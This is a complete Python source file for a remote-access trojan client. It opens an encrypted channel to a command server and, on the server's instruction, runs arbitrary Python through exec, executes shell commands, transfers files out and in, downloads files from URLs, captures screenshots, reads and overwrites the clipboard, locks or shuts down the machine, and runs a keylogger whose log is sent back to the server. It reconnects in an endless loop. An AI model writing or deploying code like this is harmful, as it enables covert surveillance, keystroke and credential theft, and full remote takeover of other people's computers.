import getpass
import json
import logging
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import traceback
from io import StringIO
from pydoc import help

import psutil
import pyperclip
import pyscreeze
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

if platform.system() == 'Windows':
    import ctypes
    LOG = os.path.dirname(sys.argv[0]) + '\\log.log'
else:
    LOG = os.path.dirname(sys.argv[0]) + '/log.log'

try:
    from pynput.keyboard import Key, Listener
    _pynput = True
except Exception as e:
    _pynput = False

logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
logging.info('Client Started.')


def read_file(path, block_size=1024): 
    with open(path, 'rb') as f: 
        while True: 
            piece = f.read(block_size) 
            if piece: 
                yield piece 
            else: 
                return


def reverse_readline(filename, buf_size=8192):
    """A generator that returns the lines of a file in reverse order"""

    # Credit: https://stackoverflow.com/a/23646049/10625567

    with open(filename) as fh:
        segment = None
        offset = 0
        fh.seek(0, os.SEEK_END)
        file_size = remaining_size = fh.tell()
        while remaining_size > 0:
            offset = min(file_size, offset + buf_size)
            fh.seek(file_size - offset)
            buffer = fh.read(min(remaining_size, buf_size))
            remaining_size -= buf_size
            lines = buffer.split('\n')
            if segment is not None:
                if buffer[-1] != '\n':
                    lines[-1] += segment
                else:
                    yield segment
            segment = lines[0]
            for index in range(len(lines) - 1, 0, -1):
                if lines[index]:
                    yield lines[index]
        if segment is not None:
            yield segment


def Hasher(MESSAGE):
    """ Hashes data """
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(MESSAGE)
    return digest.finalize()


def verifySignature(publicKey, signature, message):
    """ Verify signature with public key """
    try:
        publicKey.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except:
        return False


def sign(privateKey, data):
    """ Sign data with private key """
    signature = privateKey.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature


def encrypt(publicKey, plaintext):
    """ Encrypt using public key """
    ciphertext = publicKey.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None)
    )
    return ciphertext


def decrypt(privateKey, ciphertext):
    """ Decrypt using private key """
    plaintext = privateKey.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext


def public_bytes(publicKey):
    """ Get Public Key in Bytes """
    serializedPublic = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return serializedPublic


def errors(ERROR, line=True):
    error_class = ERROR.__class__.__name__
    error_msg = '%s' % error_class
    try:
        error_msg += ': {0}'.format(ERROR.args[0])
    except:
        error_msg += ':'
    if line:
        try:
            _, _, tb = sys.exc_info()
            line_number = traceback.extract_tb(tb)[-1][1]
            error_msg += ' (line {0})'.format(line_number)
        except:
            pass
    return error_msg


def kill(proc_pid):
    """ Kill Process by ID """
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()


def json_loads(data):
    """ Decodes and then loads json data """
    return json.loads(data.decode())


def OnKeyboardEvent(event):
    logging.info(str(event))

if _pynput:
    KeyListener = Listener(on_press=OnKeyboardEvent)
    # Check the state of the keylogger from logs
    if os.path.exists(LOG):
        for line in reverse_readline(LOG):
            if 'Started Keylogger' in line:
                KeyListener.start()
                break
            if 'Stopped Keylogger' in line:
                break


class Client(object):

    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 9999
        self.socket = None

        self.Fer_key = Fernet.generate_key()
        logging.debug(self.Fer_key)
        self.Fer = Fernet(self.Fer_key)

        self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
        self.publicKey = self.privateKey.public_key()

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except Exception as e:
            logging.error(errors(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket using RSA and agreeing on a AES key"""
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except Exception as e:
            logging.error(errors(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(public_bytes(self.publicKey))
            serverPublic = serialization.load_pem_public_key(self.socket.recv(20480), backend=default_backend())

            Hashed_Key = Hasher(self.Fer_key)
            Encrypted = encrypt(serverPublic, self.Fer_key)
            Hash_Encrypted = Hasher(Encrypted)
            Signature = sign(self.privateKey, Hashed_Key)
            Encrypted_Signature = sign(self.privateKey, Hash_Encrypted)

            def send_data(data):
                self.socket.send(str(len(data)).encode())
                self.socket.recv(4096)
                self.socket.send(data)
                self.socket.recv(4096)

            send_data(Hashed_Key)
            send_data(Encrypted)
            send_data(Hash_Encrypted)
            send_data(Signature)
            send_data(Encrypted_Signature)

            self.send(socket.gethostname().encode())
            os.chdir(os.path.dirname(sys.argv[0]))
        except Exception as e:
            logging.error(errors(e))

    def recvall(self, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = self.socket.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def receive(self):
        """ Receives Buffer Size and Data from Server Encrypted with AES """
        length = int(self.Fer.decrypt(self.socket.recv(2048)).decode())
        self.socket.send(b'<RECEIVED>')
        return self.Fer.decrypt(self.recvall(length))

    def send(self, data):
        """ Sends Buffer Size and Data to Server Encrypted with AES """
        encrypted = self.Fer.encrypt(data)
        self.socket.send(self.Fer.encrypt(str(len(encrypted)).encode()))
        self.socket.recv(1024)
        self.socket.send(encrypted)

    def send_file(self, file_to_transfer):
        """ Send file to Server """
        try:
            for line in read_file(file_to_transfer):
                self.send(line)
                self.receive()
            self.send(b'<FILE TRANSFER DONE>')
            self.receive()
            self.send(b'File Transferred Successfully')
            logging.info('Transferred {} to Server'.format(file_to_transfer))
        except Exception as e:
            self.send(b'<FILE TRANSFER DONE>')
            self.receive()
            self.send(errors(e).encode())
            logging.info(errors(e))
        return

    def receive_file(self, save_as):
        """ Receive File from Server"""
        self.send(b'<RECEIVED>')
        with open(save_as, 'wb') as f:
            while 1:
                data = self.receive()
                if data == b'<FILE TRANSFER DONE>':
                    self.send(b'File Transferred Successfully')
                    break
                f.write(data)
                self.send(b'<RECEIVED>')
        logging.info('Transferred {} to Client'.format(save_as))
        return

    def receive_commands(self):
        """ Receives Commands from Server """
        while True:
            data = json_loads(self.receive())
            # data[0]: command
            # data[1]: data1
            # data[2]: data2
            # ...

            if data[0] == '<INFO>':
                self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
                continue

            if data[0] == '--i':
                self.send(b'<READY>')
                while 1:
                    command = self.receive().decode()
                    if command == '<QUIT>':
                        self.send(b'Quitting Python Interpreter...')
                        break
                    old_stdout = sys.stdout
                    redirected_output = sys.stdout = StringIO()
                    try:
                        exec(command)
                        error = None
                    except Exception as e:
                        error = errors(e, line=False)
                    finally:
                        sys.stdout = old_stdout
                    self.send(json.dumps([redirected_output.getvalue(), error]).encode())
                continue

            if data[0] == '--x':
                if data[1] == '1':
                    self.send(b'Restarting Session...')
                    break
                if data[1] == '2':
                    self.send(b'Disconnecting Client...')
                    self.socket.close()
                    sys.exit(0)

            if data[0] == '--q':
                if data[1] == '1':
                    if platform.system() == 'Windows':
                        self.send(b'Locked Client Machine')
                        ctypes.windll.user32.LockWorkStation()
                    else:
                        self.send(b'Desktop Locking is only avaliable on Windows Clients.')
                    continue
                elif data[1] == '2':
                    if platform.system() == 'Windows':
                        subprocess.Popen('shutdown /s /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    else:
                        subprocess.Popen('shutdown -h now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                elif data[1] == '3':
                    if platform.system() == 'Windows':
                        subprocess.Popen('shutdown /r /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    else:
                        subprocess.Popen('reboot now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                # If shutdowns or restarts didn't work
                break

            if data[0] == 'LIST':
                self.socket.send(b' ')
                continue

            if data[0] == '<LISTENING>':
                self.send(b'<DONE>')
                continue

            if data[0] == '--r':
                self.send_file(data[1])
                continue

            if data[0] == '--s':
                self.receive_file(data[1])
                continue

            if data[0] == '--d':
                try:
                    r = requests.get(data[1])
                    with open(data[2], 'wb') as f:
                        f.write(r.content)
                except Exception as e:
                    self.send('Error downloading file: {}\n'.format(errors(e, line=False)).encode())
                    continue
                self.send(b'Download Successful')
                continue

            if data[0] == '--c':
                try:
                    pyperclip.copy(data[1])
                    self.send(b'Copied Successfully')
                except Exception as e:
                    self.send(errors(e).encode())
                continue

            if data[0] == '--u':
                self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
                continue

            if data[0] == '--g':
                if platform.system() == 'Windows':
                    _file = '{}\\temp.png'.format(os.environ['TEMP'])
                else:
                    _file = '{}/temp.png'.format(os.environ['HOME'])
                try:
                    pyscreeze.screenshot(_file)
                except Exception as e:
                    self.send(b'<ERROR>')
                    self.receive()
                    self.send(errors(e).encode())
                    continue
                with open(_file, 'rb') as f:
                    self.send(f.read())
                os.remove(_file)
                continue

            if data[0] == '--k start':
                if not _pynput:
                    self.send(b'Keylogger is disabled due to import error.')
                    continue
                if not KeyListener.running:
                    KeyListener.start()
                    logging.info('Started Keylogger')
                    self.send(b'Started Keylogger\n')
                    continue
                self.send(b'Keylogger already running\n')
                continue

            if data[0] == '--l':
                self.send_file(LOG)
                with open(LOG, 'w') as f:
                    f.write('')
                logging.info('Dumped Logs.')
                # Logs keylogger state
                if KeyListener.running:
                    logging.info('Started Keylogger')
                continue

            if data[0] == '--k stop':
                if not _pynput:
                    self.send(b'Keylogger is disabled due to import error.')
                if KeyListener.running:
                    logging.info('Stopped Keylogger')
                    KeyListener.stop()
                    threading.Thread.__init__(KeyListener) # re-initialise thread
                    self.send(b'Keylogger Stopped')
                    continue
                self.send(b'Keylogger not running')
                continue

            if data[0] == '--p':
                try:
                    self.send(pyperclip.paste().encode())
                except Exception as e:
                    self.send(errors(e).encode())
                continue

            if data[0] == '<GETCWD>':
                self.send(os.getcwdb())
                continue

            if data[0] == '--e':
                if data[1] == 'cd':
                    self.send(os.getcwdb())
                    continue

                if data[1][:2].lower() == 'cd' or data[1][:5] == 'chdir':
                    if platform.system() == 'Windows':
                        _pwd = ' & cd'
                    else:
                        _pwd = '; pwd'
                    process = subprocess.Popen(data[1] + _pwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    error = process.stderr.read().decode()
                    if error == "":
                        output = process.stdout.read().decode()
                        newlines = output.count('\n')
                        if newlines > 1:
                            process = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            self.send(json.dumps(['<ERROR>', process.stdout.read().decode()]).encode())
                        else:
                            os.chdir(output.replace('\n', '').replace('\r', ''))
                            self.send(json.dumps([os.getcwd()]).encode())
                    else:
                        self.send(json.dumps(['<ERROR>', error]).encode())
                    continue

                if len(data[1]) > 0:
                    if data[1] == 'tree':
                        data[1] = 'tree /A'
                    process = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    for line in iter(process.stdout.readline, ""):
                        if line == b'':
                            break
                        self.send(line.replace(b'\n', b''))
                        if self.receive() == '--q':
                            kill(process.pid)
                            break
                    self.send(process.stderr.read())
                    self.receive()
                    self.send(b'<DONE>')
                    continue


def main():
    """ Run Client """
    client = Client()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except:
            time.sleep(5)
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        logging.critical(errors(e))



if __name__ == '__main__':
    while 1:
        main()
